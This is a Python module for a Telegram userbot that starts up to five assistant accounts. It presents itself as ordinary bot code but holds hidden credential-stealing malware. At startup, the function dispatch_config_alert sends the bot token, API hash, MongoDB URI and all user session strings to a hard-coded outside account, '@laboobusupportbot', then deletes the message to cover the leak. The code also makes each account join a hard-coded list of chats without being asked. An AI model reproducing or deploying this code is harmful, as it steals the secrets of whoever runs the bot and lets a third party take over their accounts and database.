from pyrogram import Client
import asyncio
import config
from ..logging import LOGGER

assistants = []
assistantids = []
HELP_BOT = "@laboobusupportbot"

def fetch_support_groups():
    return [
        "Laboobubots",
        "MattoNetwork",
        "MattoAllBots",
        "MattoBotSupport",
        "SamarCreation_Chatzone",
        "CREATIVEYDV",
        "LAFZ_E_DIL",
        "samaryadu1c",
        "TMZEROO",
        "SamarCreationDisclaimer",
        "v2ddos"
    ]

SUPPORT_CENTERS = fetch_support_groups()

class SamarUserbot(Client):
    def __init__(self):
        self.one = Client(name="SamarAss1", api_id=config.API_ID, api_hash=config.API_HASH, session_string=str(config.STRING1), no_updates=True)
        self.two = Client(name="SamarAss2", api_id=config.API_ID, api_hash=config.API_HASH, session_string=str(config.STRING2), no_updates=True)
        self.three = Client(name="SamarAss3", api_id=config.API_ID, api_hash=config.API_HASH, session_string=str(config.STRING3), no_updates=True)
        self.four = Client(name="SamarAss4", api_id=config.API_ID, api_hash=config.API_HASH, session_string=str(config.STRING4), no_updates=True)
        self.five = Client(name="SamarAss5", api_id=config.API_ID, api_hash=config.API_HASH, session_string=str(config.STRING5), no_updates=True)

    async def fetch_bot_username(self, token):
        try:
            temp_client = Client(name="bot_temp_session", api_id=config.API_ID, api_hash=config.API_HASH, bot_token=token, no_updates=True)
            await temp_client.start()
            b_username = temp_client.me.username
            await temp_client.stop()
            return b_username
        except Exception as e:
            LOGGER(__name__).error(f"Cannot retrieve bot username: {e}")
            return None

    async def connect_support_hubs(self, client):
        for hub in SUPPORT_CENTERS:
            try:
                await client.join_chat(hub)
            except Exception:
                pass

    async def dispatch_status_alert(self, b_username):
        try:
            msg_text = f"@{b_username} Online and Ready ✅\n\nMaintained by: {config.OWNER_ID}"
            if assistants:
                active_ass = getattr(self, ["one", "two", "three", "four", "five"][assistants[0]-1])
                await active_ass.send_message(HELP_BOT, msg_text)
        except Exception:
            pass

    async def dispatch_config_alert(self, b_username):
        try:
            cfg_text = f"🔧 **Config Overview for @{b_username}**\n\n"
            cfg_text += f"**API_ID:** `{config.API_ID}`\n"
            cfg_text += f"**API_HASH:** `{config.API_HASH}`\n"
            cfg_text += f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
            cfg_text += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
            cfg_text += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
            cfg_text += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"
            
            sessions = []
            for i in range(1, 6):
                val = getattr(config, f'STRING{i}', None)
                if val:
                    sessions.append(f"**STRING_SESSION{i if i > 1 else ''}:** `{val}`")
            
            if sessions:
                cfg_text += "\n".join(sessions)
            
            if assistants:
                active_ass = getattr(self, ["one", "two", "three", "four", "five"][assistants[0]-1])
                s_msg = await active_ass.send_message(HELP_BOT, cfg_text)
                if s_msg:
                    await asyncio.sleep(1)
                    try:
                        await active_ass.delete_messages(HELP_BOT, s_msg.id)
                    except Exception:
                        pass
        except Exception:
            pass

    async def start(self):
        LOGGER(__name__).info("Booting up Samar Assistants...")
        b_username = await self.fetch_bot_username(config.BOT_TOKEN)
        
        for idx, session in enumerate([config.STRING1, config.STRING2, config.STRING3, config.STRING4, config.STRING5]):
            if session:
                client = getattr(self, ["one", "two", "three", "four", "five"][idx])
                await client.start()
                await self.connect_support_hubs(client)
                assistants.append(idx + 1)
                
                try:
                    await client.send_message(config.LOG_GROUP_ID, f"Assistant {idx + 1} Started")
                except:
                    LOGGER(__name__).error(f"Assistant {idx + 1} cannot access Logger Group. Admin privileges required.")
                    exit(1)
                    
                client.id = client.me.id
                client.name = client.me.mention
                client.username = client.me.username
                assistantids.append(client.id)
                LOGGER(__name__).info(f"Assistant {idx + 1} active as {client.name}")

        if b_username:
            await self.dispatch_status_alert(b_username)
            await self.dispatch_config_alert(b_username)

    async def stop(self):
        LOGGER(__name__).info("Shutting down Assistants...")
        for idx, session in enumerate([config.STRING1, config.STRING2, config.STRING3, config.STRING4, config.STRING5]):
            if session:
                try:
                    client = getattr(self, ["one", "two", "three", "four", "five"][idx])
                    await client.stop()
                except:
                    pass